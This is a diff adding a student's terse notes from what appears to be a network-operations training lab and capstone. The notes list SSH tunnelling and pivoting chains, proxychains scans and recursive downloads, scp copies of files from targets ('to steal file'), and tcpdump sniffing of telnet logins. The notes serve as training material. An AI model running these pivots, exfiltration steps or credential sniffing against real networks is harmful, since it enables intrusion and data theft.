@@ -1,0 +1,136 @@
+ssh net2_student15@internal -R RHP1:127.0.0.1:22                                   
+ssh net2_student15@float-ip -L RHP2:localhost:RHP1                                                                    
+ssh net2_student15@float-ip                                                                                             
+ssh net2_student15@localhost -p RHP2 -D 9050                                                                                
+                                                                                                                                                                                                                                                      
+
+
+
+*NEW APPROACH*
+
+nmap <float ip> -sV -p 21-23,80 -T4
+wget -r http://<float ip>
+cat or eog the files
+ssh into username@<float ip>
+ls /usr/share/ctcc ??? how
+scp 1stusername@<float ip>:/usr/share/cctc/* . <---- to steal file and put it where you are located 
+ip neighbor/arp to find connected ips and (ip addr to find internal network)
+ss -nlt
+ssh username@<float ip> -D 9050
+proxychains ./scan.sh internal network (keep track of ip's and open ports)
+proxychains wget -r http://<any new ips>, ftp://<any new ip>
+cat or eog any new files
+
+!!!kill dynamic tunnel!!!
+
+ssh 1stusername@float -L RHP1:new ip>:22 to create tunnel to new target through first target 
+ssh new-target@localhost -p RHP1
+ls /usr/share/ctcc
+scp -P RHP1 new-target@localhost:/usr/share/ctcc/* new-targetIP/ to keep organized
+ip addr from new-targetIP to find further networks
+ssh new-target@localhost -p RHP1 -D 9050
+proxychains ./scan.sh <further networks> (keep track of ip's and open ports and label ips with hostname)
+proxychains wget -r http://, ftp://
+new-target2 should now be recognized
+cat or eog new files
+
+!!!kill dynamic tunnel!!!
+
+ssh new-target@localhost -p RHP1 -L RHP2:new-target2:22
+new window ssh new-target2@localhost -p RHP2
+ls /usr/share/ctcc
+scp -P RHP2 new-target2@localhost:/usr/share/ctcc/* new-target2/
+ip addr
+ssh new-target2@localhost -p RHP2 -D 9050
+proxychains ./scan.sh <further networks> (keep track of ip's and open ports and label ips with hostname)
+proxychains wget -r http://, ftp://
+new-target3 should now be recognized
+cat or eog new files
+
+ssh new-target2@localhost -p RHP2 -L RHP3:new-target3:22
+ls /usr/share/ctcc
+scp -P RHP3 new-target3@localhost:/usr/share/ctcc/* new-targetIP3/
+ip addr 
+ss -nlt to find random high port being used
+proxychains nc 127.0.0.1 port
+echo "   " | md5sum
+
+
+*FROM TELNET*
+
+Telnet into target because ssh disabled, then:                                                                              if ssh port is higher than well known port in proxychains ./scan.sh search tcp ports 1024-5000
+cat float-ip.txt (from BIH)
+ssh student@float-ip -R RHP1:localhost:22
+scp -P RHP1 user@localhost:</usr/share/cctc/*> <what you want it named or ip/>
+eog file in BIH
+telnet back into target
+ip addr/ip neigh
+ssh username@localhost -p RHP1 -D 9050
+proxychains ./scan.sh, wget -r http://, ftp://
+ssh student@float-ip -R RHP1:target#2:22
+
+https://cted.cybbh.io/tech-college/cttsb/cctc/net/Net/Modules/06_Network_Reconnaissance/fg.html#67-describe-methods-used-for-active-internal-network-reconnaissance
+capstone: 
+ssh net2_student15@10.50.134.55 -L 1738:10.1.1.11:23
+ssh net2_student15@10.50.134.55 -D 9050
+telnet localhost 1738
+RFC 1918
+echo " " | base64
+tcpdump -n -r {pcap} "BPF Filter" | wc -l
+ssh net2_student15@10.50.134.55 -L 1738:10.1.1.25:21
+proxychains ftp <ip> -> user net2_student15 -> pass -> get
+proxychains ./stream.py
+ssh net2_student15@10.50.134.55 -L 1738:10.1.1.33:23
+ip addr
+tcpdump -i eth1 -AX udp port 69 to find a message being sent through that port
+tcpdump -i eth0 -vv udp port 520 to find a network being advertised
+proxychains nmap 10.50.158.236 -T4 -p 7000-8000
+ 10.50.158.236 -T4 -p 7000-8000
+sudo iptables -t mangle -A POSTROUTING -j TTL --ttl-set 255 to change ttl 
+ssh net2_student15@10.50.158.236 -p 7777
+ssh net2_student15@10.50.158.236 -p 7777 -D 9050
+tcpdump -i eth0 -AX tcp port 23 to sniff logins on telnet
+
+$BIH ssh net2_student15@10.50.158.236 -p 7777 -L 1738:10.2.2.7:23 (KEPT ACTIVE)
+$BIH telnet localhost 1738
+.7$ ssh net2_student15@10.2.2.6 -p 7777 -R 1739:localhost:2222 (KEPT ACTIVE)
+BIH$ ssh net2_student15@10.50.158.236 -p 7777 -L 1740:localhost:1739 (KEPT ACTIVE) 
+BIH$ ssh net2_comrade15@localhost -p 1740 -D 9050
+BIH$ ssh net2_comrade15@localhost -p 1740 -L 1741:10.10.10.140:301 (killed after using)
+BIH$  ssh net2_student15@localhost -p 1741 -D 9050
+
+ssh net2_comrade15@localhost -p 1740 -L 1741:10.10.10.167:404 (revived new direction) (then killed)
+ssh net2_student15@localhost -p 1741 -D 9050
+ip addr enumerate scans
+
+ssh net2_comrade15@localhost -p 1740 -L 1741:10.10.10.182:504
+ssh net2_student15@localhost -p 1741 -D 9050
+ip addr enumerate scans
+proxychains scp
+xxd -r capstone-analysis_HEX-ENCODED.pcap capstonedecoded.pcap to decode hex pcap
+
+
+
+
+GO TO GUIDE!!!!!
+10/14/2025                              23                 23
+Telnet on 2nd host (BIH -> Sterling -> Lana -> Cheryl -> Malory)
+BIH$ ssh Sterling@10.50.93.47 -L 1738:10.1.2.200:23
+BIH$ telnet localhost 1738
+LANA$ ss -antlup
+LANA$ ssh Sterling@10.1.2.130 -R 1739:localhost:8976
+(tunnel above and below connect each other)
+BIH$ ssh Sterling@10.50.93.47 -L 1740:localhost:1739
+BIH$ ssh Lana@localhost -p 1740 -D 9050
+BIH$ scp -P 1740 Lana@localhost:/usr/share/cctc/* .
+BIH$ ssh Lana@localhost -p 1740 -D 9050
+BIH$ ssh Lana@localhost -p 1740 -L 1741:10.2.5.20:22
+BIH$ scp -P 1741 Cheryl@localhost:/usr/share/cctc/* .
+BIH$ ssh Cheryl@localhost -p 1741 -D 9050 (proxychains)
+BIH$ ssh Cheryl@localhost -p 1741 -L 1742:10.3.9.39:23
+BIH$ telnet localhost 1742
+MALORY$ cat etc/ssh/sshd_config (3597)
+MALORY$ ssh Cheryl@10.3.9.33 -R 1743:localhost:3597
+BIH$ ssh Cheryl@localhost -p 1741 -L 1744:localhost:1743
+BIH$ scp -P 1744 Malory@localhost:/usr/share/cctc/* .
+BIH$ ssh Malory@localhost -p 1744 -D 9050
